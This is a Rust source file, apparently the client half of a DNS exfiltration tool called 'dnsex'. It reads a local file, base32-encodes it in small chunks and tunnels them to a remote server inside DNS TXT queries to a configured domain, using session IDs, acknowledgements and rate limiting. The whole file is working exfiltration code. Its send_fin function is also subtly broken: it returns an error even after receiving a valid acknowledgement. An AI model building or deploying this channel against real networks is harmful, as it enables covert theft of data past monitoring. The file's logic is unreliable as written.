use crate::error::DnsexError;
use crate::handler::ChunkFlag;
use data_encoding::BASE32_NOPAD;
use hickory_client::client::{AsyncClient, ClientHandle};
use hickory_proto::rr::{DNSClass, Name, RData, RecordType};
use hickory_proto::udp::UdpClientStream;
use rand::Rng;
use std::io::{self, Write};
use std::net::SocketAddr;
use std::str::FromStr;
use tokio::fs::File;
use tokio::io::{AsyncReadExt, BufReader};
use tokio::net::UdpSocket as TokioUdpSocket;
use tokio::time::{Duration, sleep};

const CHUNK_SIZE: usize = 39;
const MAX_FIN_RETRIES: usize = 5;
const MAX_INIT_RETRIES: usize = 5;

#[derive(Debug)]
pub struct ExfilPayload {
    pub filename: String,
    pub bufreader: BufReader<File>,
    pub size: u64,
}

#[derive(Debug, Clone)]
pub struct ClientConfig {
    pub domain: String,
    pub resolver_ip: String,
    pub port: u16,
    pub rate_limit_ms: u64,
    pub progress: bool,
}

pub struct Client {
    config: ClientConfig,
}

impl Client {
    pub fn new(config: ClientConfig) -> Self {
        Self { config }
    }

    fn generate_session_id() -> String {
        let n: u16 = rand::thread_rng().r#gen();
        format!("{:04x}", n)
    }

    fn build_fqdn(&self, data: &str, seq: usize, id: &str, flags: u32) -> String {
        format!("{}.{}.{}.{}.{}", data, seq, id, flags, self.config.domain)
    }

    async fn get_client(&self) -> Result<AsyncClient, DnsexError> {
        let addr_str = format!("{}:{}", self.config.resolver_ip, self.config.port);
        let name_server: SocketAddr = addr_str
            .parse()
            .map_err(|_| DnsexError::ConfigError(format!("Invalid resolver IP: {}", addr_str)))?;

        let stream = UdpClientStream::<TokioUdpSocket>::new(name_server);
        let (client, background_task) = AsyncClient::connect(stream).await?;

        tokio::spawn(background_task);
        Ok(client)
    }

    async fn send_init(&self, client: &mut AsyncClient, filename: &str, session_id: &str, total_chunks: usize) -> Result<(), DnsexError> {
        for (_, chunk) in filename.as_bytes().chunks(CHUNK_SIZE).enumerate() {
            let init_fqdn = self.build_fqdn(&BASE32_NOPAD.encode(chunk), total_chunks, session_id, ChunkFlag::Init as u32);

            let mut acked = false;
            for _ in 0..MAX_INIT_RETRIES {
                let responses = self.send_query(client, &init_fqdn).await?;
                if responses.iter().any(|r| r == "OK") {
                    acked = true;
                    break;
                }
            }

            if !acked {
                return Err(DnsexError::TransferError("Failed to init transfer".into()));
            }
        }

        Ok(())
    }

    async fn send_data(
        &self,
        client: &mut AsyncClient,
        bufreader: &mut BufReader<File>,
        filename: &str,
        session_id: &str,
        total_chunks: usize,
    ) -> Result<(), DnsexError> {
        let mut chunk_buffer = vec![0u8; CHUNK_SIZE];
        let mut seq = 0;

        loop {
            let mut bytes_read = 0;
            while bytes_read < CHUNK_SIZE {
                let n = bufreader.read(&mut chunk_buffer[bytes_read..]).await?;
                if n == 0 {
                    break;
                }

                bytes_read += n;
            }

            if bytes_read == 0 {
                break;
            }

            let chunk = &chunk_buffer[..bytes_read];

            loop {
                let data_fqdn = self.build_fqdn(&BASE32_NOPAD.encode(chunk), seq, session_id, ChunkFlag::Data as u32);

                if self.config.progress {
                    let progress: f32 = (((seq + 1) as f32 / total_chunks as f32) * 100.0) as f32;
                    let mut out = io::stdout();

                    let status = format!("[{:.2}% {}/{} {}] {}", progress, seq + 1, total_chunks, filename, data_fqdn);
                    let _ = out.write_all(b"\x1b[2K\x1b[1G");
                    let _ = out.write_all(status.as_bytes());
                    let _ = out.flush();
                }

                let seq_str = seq.to_string();
                let response = self.send_query(client, &data_fqdn).await?;
                if response.iter().any(|r| r == &seq_str) {
                    break;
                }
            }

            seq += 1;
        }

        println!();
        Ok(())
    }

    async fn send_fin(&self, client: &mut AsyncClient, session_id: &str, total_chunks: usize) -> Result<(), DnsexError> {
        let flags = ChunkFlag::Fin as u32;
        let fin_fqdn = self.build_fqdn(&BASE32_NOPAD.encode("EOF".as_bytes()), total_chunks, session_id, flags);

        for _ in 0..MAX_FIN_RETRIES {
            let responses = self.send_query(client, &fin_fqdn).await?;

            if responses.is_empty() {
                continue;
            }

            if responses.iter().any(|r| r == "OK") {
                break;
            }
        }

        Err(DnsexError::TransferError("Failed to get valid FIN response from server".into()))
    }

    pub async fn send_payload(&self, mut payload: ExfilPayload) -> Result<(), DnsexError> {
        let mut client = self.get_client().await?;
        let session_id = Client::generate_session_id();
        let total_chunks = (payload.size as usize + CHUNK_SIZE - 1) / CHUNK_SIZE;

        self.send_init(&mut client, &payload.filename, &session_id, total_chunks).await?;
        self.send_data(&mut client, &mut payload.bufreader, &payload.filename, &session_id, total_chunks)
            .await?;
        self.send_fin(&mut client, &session_id, total_chunks).await?;

        Ok(())
    }

    async fn send_query(&self, client: &mut AsyncClient, fqdn: &str) -> Result<Vec<String>, DnsexError> {
        let domain_name = Name::from_str(fqdn)?;
        let response = client.query(domain_name, DNSClass::IN, RecordType::TXT).await?;
        let mut responses: Vec<String> = Vec::new();

        for answer in response.answers() {
            if let Some(RData::TXT(txt)) = answer.data() {
                for bytes in txt.iter() {
                    if let Ok(text) = std::str::from_utf8(bytes) {
                        responses.push(text.to_string());
                    }
                }
            }
        }

        sleep(Duration::from_millis(self.config.rate_limit_ms)).await;
        Ok(responses)
    }
}
